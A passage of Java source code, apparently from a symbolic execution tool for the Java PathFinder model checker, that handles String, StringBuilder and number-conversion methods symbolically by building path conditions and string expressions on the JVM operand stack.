id,title,username,language,date,content
				handlefloatValue(invInst, th);
			} else if (shortName.equals(""isEmpty"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()){
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleIsEmpty(invInst, th);
					return invInst.getNext(th);
				}
			}else {
				throw new RuntimeException(""ERROR: symbolic method not handled: "" + shortName);
				//return null;
			}
			return invInst.getNext(th);
		} else {
			return null;
		}

	}

	private boolean handleCharAt (JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);
		boolean bresult = false;
		if ((sym_v1 == null) & (sym_v2 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleCharAt"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();

			IntegerExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete

				int val = s1;
				result = sym_v2._charAt(new IntegerConstant(val));
			} else {

				if (sym_v2 == null) {
					ElementInfo e1 = th.getElementInfo(s2);
					String val2 = e1.asString();
					sym_v2 = new StringConstant(val2);
					result = sym_v2._charAt(sym_v1);
				} else {
					result = sym_v2._charAt(sym_v1);
				}
				bresult = true;
				//System.out.println(""[handleCharAt] Ignoring: "" + result.toString());
				//th.push(0, false);
			}
			sf.push(0, false);
			sf.setOperandAttr(result);
		}
		return bresult; // not used

	}

	public void handleLength(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleLength"");
		} else {
			sf.pop();
			sf.push(0, false); /* dont care value for length */
			IntegerExpression sym_v2 = sym_v1._length();
			sf.setOperandAttr(sym_v2);
		}

	}

	public void handleIndexOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		int numStackSlots = invInst.getArgSize();
		if (numStackSlots == 2) {
			handleIndexOf1(invInst, th);
		} else {
			handleIndexOf2(invInst, th);
		}

	}

	/* two possibilities int, or String in parameter */
	public void handleIndexOf1(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		
		//boolean castException = false;
		StringExpression sym_v1 = null;
		Expression sym_v2 = null; // could be String or Char
		sym_v1 = (StringExpression)sf.getOperandAttr(1);
		sym_v2 = (Expression) sf.getOperandAttr(0);
		if (sym_v1 == null && sym_v2 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleIndexOf1"");
		} else {
			boolean s2char = true; //argument is char
			if (sf.isOperandRef()) {
				s2char = false; //argument is string
			}
			
			int s1 = sf.pop();
			int s2 = sf.pop();

			IntegerExpression result = null;
			if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						if (s2char) 
							result = sym_v1._indexOf((IntegerExpression)sym_v2);
						else
							result = sym_v1._indexOf((StringExpression)sym_v2);
					} else { // sym_v2 is null
						if (s2char) {
							result = sym_v1._indexOf(new IntegerConstant(s2));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._indexOf(new StringConstant(val));
						}
					}
			} else { // sym_v1 is null, sym_v2 must be not null
				    assert(sym_v2!=null);
					ElementInfo e1 = th.getElementInfo(s2);
					String val = e1.asString();
                    if (s2char) 
						result = new StringConstant(val)._indexOf((IntegerExpression)sym_v2);
					else
						result = new StringConstant(val)._indexOf((StringExpression)sym_v2);
			}
			sf.push(0, false);
			assert result != null;
			sf.setOperandAttr(result);


		}
	}

	/* two possibilities int, int or int, String in parameters */
	public void handleIndexOf2(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();

		StringExpression sym_v1 = null;
		Expression sym_v2 = null;
		IntegerExpression intExp = null;
		sym_v1 = (StringExpression) sf.getOperandAttr(2);
		intExp = (IntegerExpression) sf.getOperandAttr(0);
		sym_v2 = (Expression) sf.getOperandAttr(1);

		if (sym_v1 == null && sym_v2 == null && intExp == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleIndexOf2"");
		} else {

			int i1 = sf.pop();
			boolean s2char = true;
			if (sf.isOperandRef()) {
				//System.out.println(""[handleIndexOf2] string detected"");
				s2char = false;
			}
			
			int s2 = sf.pop();
			int s1 = sf.pop();

			IntegerExpression result = null;
			if (intExp != null) {
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						if (s2char)
							result = sym_v1._indexOf((IntegerExpression)sym_v2, intExp);
						else
							result = sym_v1._indexOf((StringExpression)sym_v2, intExp);
					} else { //sym_v2 is null
						if (s2char) {
							result = sym_v1._indexOf(new IntegerConstant(s2), intExp);
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._indexOf(new StringConstant(val), intExp);
						}
					}
				} else { // sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();

					if (sym_v2 != null) { 
						if(s2char)
							result = new StringConstant(val)._indexOf((IntegerExpression)sym_v2, intExp);
						else
							result = new StringConstant(val)._indexOf((StringExpression)sym_v2, intExp);
					} else {
						if (s2char) {
							result = new StringConstant(val)._indexOf(new IntegerConstant(s2), intExp);
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val2 = e2.asString();
							result = new StringConstant(val)._indexOf(new StringConstant(val2), intExp);
						}
					}
				}
			}
			else { //intExp is null
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						if(s2char)
							result = sym_v1._indexOf((IntegerExpression)sym_v2, new IntegerConstant(i1));
						else
							result = sym_v1._indexOf((StringExpression)sym_v2, new IntegerConstant(i1));
					} else { //sym_v1 is null
						if (s2char) {
							result = sym_v1._indexOf(new IntegerConstant(s2), new IntegerConstant(i1));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._indexOf(new StringConstant(val), new IntegerConstant(i1));
							//System.out.println(""[handleIndexOf2] Special push"");
							//Special push?
							//th.push(s1, true);
						}
					}
				} else {//sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();

					if (sym_v2 != null) { 
						if(s2char)
							result = new StringConstant(val)._indexOf((IntegerExpression)sym_v2, new IntegerConstant(i1));
						else
							result = new StringConstant(val)._indexOf((StringExpression)sym_v2, new IntegerConstant(i1));
					} else {
						if (s2char) {
							result = new StringConstant(val)._indexOf(new IntegerConstant(s2), new IntegerConstant(i1));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val2 = e2.asString();
							result = new StringConstant(val)._indexOf(new StringConstant(val2), new IntegerConstant(i1));
						}
					}
				}
			}
			sf.push(0, false);
			assert result != null;
			sf.setOperandAttr(result);

		}
	}
	
	public void handleLastIndexOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		int numStackSlots = invInst.getArgSize();
		if (numStackSlots == 2) {
			handleLastIndexOf1(invInst, th);
		} else {
			handleLastIndexOf2(invInst, th);
		}
	}

	public void handleLastIndexOf1(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		//boolean castException = false;
		StringExpression sym_v1 = null;
		StringExpression sym_v2 = null;
		sym_v1 = (StringExpression) sf.getOperandAttr(1);
		/*	*/
		sym_v2 = (StringExpression) sf.getOperandAttr(0);
		if (sym_v1 == null && sym_v2 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleLastIndexOf1"");
		} else {
			boolean s1char = true; //argument is char
			if (sf.isOperandRef()) {
				s1char = false; //argument is string
			}
			int s1 = sf.pop();
			int s2 = sf.pop();

			IntegerExpression result = null;
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						result = sym_v1._lastIndexOf(sym_v2);
					} else {
						if (s1char) {
							result = sym_v1._lastIndexOf(new IntegerConstant(s1));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s1);
							String val = e2.asString();
							result = sym_v1._lastIndexOf(new StringConstant(val));
						}
					}
				} else {//sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s2);
					String val = e1.asString();
					assert(sym_v2!=null);
					result = new StringConstant(val)._lastIndexOf(sym_v2);
					
				}
			
			sf.push(0, false);
			assert result != null;
			sf.setOperandAttr(result);

		}
	}

	public void handleLastIndexOf2(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();

		StringExpression sym_v1 = null;
		StringExpression sym_v2 = null;
		IntegerExpression intExp = null;
		sym_v1 = (StringExpression) sf.getOperandAttr(2);
		intExp = (IntegerExpression) sf.getOperandAttr(0);
		sym_v2 = (StringExpression) sf.getOperandAttr(1);

		if (sym_v1 == null && sym_v2 == null && intExp == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleLastIndexOf2"");
		} else {
			int i1 = sf.pop();
			boolean s2char = true;
			if (th.getModifiableTopFrame().isOperandRef()) {
				s2char = false;
			}
			
			int s2 = sf.pop();
			int s1 = sf.pop();

			IntegerExpression result = null;
			if (intExp != null) {
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						result = sym_v1._lastIndexOf(sym_v2, intExp);
					} else {
						if (s2char) {
							result = sym_v1._lastIndexOf(new IntegerConstant(s2), intExp);
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._lastIndexOf(new StringConstant(val), intExp);
						}
					}
				} else { //sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();

					if (sym_v2 != null) { 
						result = new StringConstant(val)._lastIndexOf(sym_v2, intExp);
					} else {
						if (s2char) {
							result = new StringConstant(val)._lastIndexOf(new IntegerConstant(s2), intExp);
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val2 = e2.asString();
							result = new StringConstant(val)._lastIndexOf(new StringConstant(val2), intExp);
						}
					}
				}
			}
			else { // intExp is null
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						result = sym_v1._lastIndexOf(sym_v2, new IntegerConstant(i1));
					} else {
						if (s2char) {
							result = sym_v1._lastIndexOf(new IntegerConstant(s2), new IntegerConstant(i1));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._lastIndexOf(new StringConstant(val), new IntegerConstant(i1));
							//System.out.println(""[handleIndexOf2] Special push"");
							//Special push?
							//th.push(s1, true);
						}
					}
				} else { // sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();
					assert(sym_v2!=null);
					result = new StringConstant(val)._lastIndexOf(sym_v2, new IntegerConstant(i1));
				}
			}
			
			sf.push(0, false);
			assert result != null;
			sf.setOperandAttr(result);

		}
	}


	

	public void handlebooleanValue(JVMInvokeInstruction invInst, SystemState ss, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandlebooleanValue"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				sf.push(0, false);
				sf.setOperandAttr(sym_v2);
			} else {
				throw new RuntimeException(""ERROR: operand type not tackled - booleanValue"");
			}

		}

	}

	public void handleintValue(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleintValue"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				sf.push(0, false);
				sf.setOperandAttr(sym_v2);
			} else {
				th.printStackTrace();
				throw new RuntimeException(""ERROR: operand type not tackled - intValue"");
			}
		}
	}

	public void handlelongValue(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: hanldeLongValue"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				sf.pushLong((long) 0);
				sf.setLongOperandAttr(sym_v2);
			} else {
				throw new RuntimeException(""ERROR: operand type not tackled - longValue"");
			}

		}

	}

	public void handlefloatValue(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand: hanldeFloatValue"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				RealExpression sym_v2 = (RealExpression) sym_v3;
				sf.pop();
				sf.push(0, false);
				sf.setOperandAttr(sym_v2);
			} else {
				throw new RuntimeException(""ERROR: operand type not tackled - floatValue"");
			}

		}

	}

	public void handledoubleValue(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand: hanldeDoubleValue"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				RealExpression sym_v2 = (RealExpression) sym_v3;
				sf.pop();
				sf.pushLong((long) 0);
				sf.setLongOperandAttr(sym_v2);
			} else {
				throw new RuntimeException(""ERROR: operand type not tackled - doubleValue"");
			}

		}

	}

	/*
	 * StringBuilder or StringBuffer or BigDecimal initiation with symbolic
	 * primitives
	 */

	public Instruction handleInit(JVMInvokeInstruction invInst,  ThreadInfo th) {

		String cname = invInst.getInvokedMethodClassName();
		if (cname.equals(""java.lang.StringBuilder"") || cname.equals(""java.lang.StringBuffer"")) {
			StackFrame sf = th.getModifiableTopFrame();
			StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
			SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);
			if (sym_v1 == null) {
				throw new RuntimeException(""ERROR: symbolic StringBuilder method must have one symbolic operand in Init"");
			} else {
				sf.pop(); /* string object */
				sf.pop(); /* one stringBuilder Object */
				sym_v2.putstr(sym_v1);
				sf.setOperandAttr(sym_v2);
				return invInst.getNext();
			}
		} else {
			// Corina TODO: we should allow symbolic string analysis to kick in only when desired
			//throw new RuntimeException(""Warning Symbolic String Analysis: Initialization type not handled in symbc/bytecode/SymbolicStringHandler init"");
			return null;
		}
	}

	/***************************** Symbolic Big Decimal Routines end ****************/


	private void handleBooleanStringInstructions(JVMInvokeInstruction invInst,  ThreadInfo th, StringComparator comp) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);

		if ((sym_v1 == null) & (sym_v2 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleStartsWith"");
		} else {
			ChoiceGenerator<?> cg;
			boolean conditionValue;

			cg = th.getVM().getChoiceGenerator();
			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			// System.out.println(""conditionValue: "" + conditionValue);

			int s1 = sf.pop();
			int s2 = sf.pop();
			PathCondition pc;

			// pc is updated with the pc stored in the choice generator above
			// get the path condition from the
			// previous choice generator of the same type

			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null) {
				pc = new PathCondition();
			} else {
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();
			}

			assert pc != null;

			if (conditionValue) {
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						pc.spc._addDet(comp, sym_v1, sym_v2);
					} else {
						ElementInfo e2 = th.getElementInfo(s2);
						String val = e2.asString();
						pc.spc._addDet(comp, sym_v1, val);
					}
				} else {
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();
					pc.spc._addDet(comp, val, sym_v2);
				}
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					// pc.solve();
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					// System.out.println(((PCChoiceGenerator) cg).getCurrentPC());
				}
			} else {
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						pc.spc._addDet(comp.not(), sym_v1, sym_v2);
					} else {
						ElementInfo e2 = th.getElementInfo(s2);
						String val = e2.asString();
						pc.spc._addDet(comp.not(), sym_v1, val);

					}
				} else {
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();
					pc.spc._addDet(comp.not(), val, sym_v2);
				}
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
				}
			}

			sf.push(conditionValue ? 1 : 0, true);

		}

	}

	public void handleEqualsIgnoreCase(JVMInvokeInstruction invInst,  ThreadInfo th) {
		throw new RuntimeException(""ERROR: symbolic string method not Implemented - EqualsIgnoreCase"");
	}

	public void handleEndsWith(JVMInvokeInstruction invInst,  ThreadInfo th) {
		//throw new RuntimeException(""ERROR: symbolic string method not Implemented - EndsWith"");
		handleBooleanStringInstructions(invInst,  th, StringComparator.ENDSWITH);
	}

	public void handleContains (JVMInvokeInstruction invInst,  ThreadInfo th) {
		handleBooleanStringInstructions(invInst,  th, StringComparator.CONTAINS);
	}


	public void handleStartsWith(JVMInvokeInstruction invInst,  ThreadInfo th) {
		//throw new RuntimeException(""ERROR: symbolic string method not Implemented - StartsWith"");
		handleBooleanStringInstructions(invInst, th, StringComparator.STARTSWITH);
	}

	//Only supports character for character
	public Instruction handleReplace(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);
		StringExpression sym_v3 = (StringExpression) sf.getOperandAttr(2);

		if ((sym_v1 == null) & (sym_v2 == null) & (sym_v3 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleReplace"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			int s3 = sf.pop();
			//System.out.println(""[handleReplace] "" + s1 + "" "" + s2 + "" "" + s3);
			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				//ElementInfo e1 = th.getElementInfo(s1);
				String val = String.valueOf((char) s1);
				if (sym_v2 == null) { // sym_v3 has to be symbolic
					//ElementInfo e2 = th.getElementInfo(s2);
					//String val1 = e2.asString();
					result = sym_v3._replace(val, String.valueOf((char)s2));
				} else {
					if (sym_v3 == null) { // only sym_v2 is symbolic
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replace(val, sym_v2);
					} else {
						result = sym_v3._replace(val, sym_v2);
					}
				}
			} else { // sym_v1 is symbolic
				if (sym_v2 == null) {
					if (sym_v3 == null) {
						//ElementInfo e2 = th.getElementInfo(s2);
						String val1 = String.valueOf((char) s2);
						//ElementInfo e3 = th.getElementInfo(s3);
						String val2 = String.valueOf((char) s3);
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replace(sym_v1, val1);
					} else {
						//ElementInfo e2 = th.getElementInfo(s2);
						String val1 = String.valueOf((char) s2);
						result = sym_v3._replace(sym_v1, val1);
					}
				} else {
					if (sym_v3 == null) {
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replace(sym_v1, sym_v2);
					} else {
						result = sym_v3._replace(sym_v1, sym_v2);
					}
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef.getObjectRef(), true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public Instruction handleSubString(JVMInvokeInstruction invInst, ThreadInfo th) {
		int numStackSlots = invInst.getArgSize();
		if (numStackSlots == 2) {
			return handleSubString1(invInst, th);
		} else {
			return handleSubString2(invInst, th);
		}
	}

	public Instruction handleSubString1(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);

		if ((sym_v1 == null) & (sym_v2 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleSubString1"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();

			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				int val = s1;
				result = sym_v2._subString(val);
			} else {
				if (sym_v2 == null) {
					ElementInfo e1 = th.getElementInfo(s2);
					String val2 = e1.asString();
					sym_v2 = new StringConstant(val2);
					result = sym_v2._subString(sym_v1);
				} else {
					result = sym_v2._subString(sym_v1);
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef.getObjectRef(), true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public Instruction handleSubString2(JVMInvokeInstruction invInst, ThreadInfo th) {
		//System.out.println(""[SymbolicStringHandler] doing"");
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		IntegerExpression sym_v2 = (IntegerExpression) sf.getOperandAttr(1);
		StringExpression sym_v3 = (StringExpression) sf.getOperandAttr(2);

		if ((sym_v1 == null) & (sym_v2 == null) & (sym_v3 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleSubString2"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			int s3 = sf.pop();
			//System.out.printf(""[SymbolicStringHandler] popped %d %d %d\n"", s1, s2, s3);
			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				int val = s1;
				if (sym_v2 == null) { // sym_v3 has to be symbolic
					int val1 = s2;
					result = sym_v3._subString(val, val1);
					//System.out.println(""[SymbolicStringHandler] special push"");
					/* Only if both arguments are concrete, something else needs
					 * to be pushed?
					 */
					//sf.push(s3, true); /* symbolic string element */
				} else {
					if (sym_v3 == null) { // only sym_v2 is symbolic
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._subString(val, sym_v2);
					} else {
						result = sym_v3._subString(val, sym_v2);
					}
				}
			} else { // sym_v1 is symbolic
				if (sym_v2 == null) {
					if (sym_v3 == null) {
						int val1 = s2;
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._subString(sym_v1, val1);
					} else {
						int val1 = s2;
						result = sym_v3._subString(sym_v1, val1);
					}
				} else {
					if (sym_v3 == null) {
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._subString(sym_v1, sym_v2);
					} else {
						result = sym_v3._subString(sym_v1, sym_v2);
					}
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th);
			//System.out.println(""[SymbolicStringHandler] "" + sf.toString());
			sf.push(objRef.getObjectRef(), true);
			//System.out.println(""[SymbolicStringHandler] "" + sf.toString());
			sf.setOperandAttr(result);
		}

		return null;
	}

	public Instruction handleReplaceFirst(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);
		StringExpression sym_v3 = (StringExpression) sf.getOperandAttr(2);

		if ((sym_v1 == null) & (sym_v2 == null) & (sym_v3 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HanldeReplaceFirst"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			int s3 = sf.pop();

			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				ElementInfo e1 = th.getElementInfo(s1);
				String val = e1.asString();
				if (sym_v2 == null) { // sym_v3 has to be symbolic
					ElementInfo e2 = th.getElementInfo(s2);
					String val1 = e2.asString();
					result = sym_v3._replaceFirst(val, val1);

				} else {
					if (sym_v3 == null) { // only sym_v2 is symbolic
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replaceFirst(val, sym_v2);
					} else {
						result = sym_v3._replaceFirst(val, sym_v2);
					}
				}
			} else { // sym_v1 is symbolic
				if (sym_v2 == null) {
					if (sym_v3 == null) {
						ElementInfo e2 = th.getElementInfo(s2);
						String val1 = e2.asString();
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replaceFirst(sym_v1, val1);
					} else {
						ElementInfo e2 = th.getElementInfo(s2);
						String val1 = e2.asString();
						result = sym_v3._replaceFirst(sym_v1, val1);
					}
				} else {
					if (sym_v3 == null) {
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replaceFirst(sym_v1, sym_v2);
					} else {
						result = sym_v3._replaceFirst(sym_v1, sym_v2);
					}
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef.getObjectRef(), true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public void handleTrim(JVMInvokeInstruction invInst, ThreadInfo th) {
		// throw new RuntimeException(""ERROR: symbolic string method not Implemented - Trim"");
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		int s1 = sf.pop();

		if (sym_v1 == null) {
			ElementInfo e1 = th.getElementInfo(s1);
			String val1 = e1.asString();
			sym_v1 = new StringConstant(val1);
		}
		StringExpression result = sym_v1._trim();

		ElementInfo  objRef = th.getHeap().newString("""", th); /*
																																 * dummy String
																																 * Object
																																 */
		sf.push(objRef.getObjectRef(), true);
		sf.setOperandAttr(result);
	}

	public Instruction handleValueOf(JVMInvokeInstruction invInst,  ThreadInfo th) {
		MethodInfo mi = invInst.getInvokedMethod(th);
		String cname = invInst.getInvokedMethodClassName();
		String[] argTypes = mi.getArgumentTypeNames();
		if (cname.equals(""java.lang.String"")) {
			// System.out.println(argTypes[0]);
			if (argTypes[0].equals(""int"")) {
				return handleIntValueOf(invInst,  th);
			} else if (argTypes[0].equals(""float"")) {
				return handleFloatValueOf(invInst, th);
			} else if (argTypes[0].equals(""long"")) {
				return handleLongValueOf(invInst, th);
			} else if (argTypes[0].equals(""double"")) {
				return handleDoubleValueOf(invInst, th);
			} else if (argTypes[0].equals(""char"")) {
				return handleCharValueOf(invInst, th);
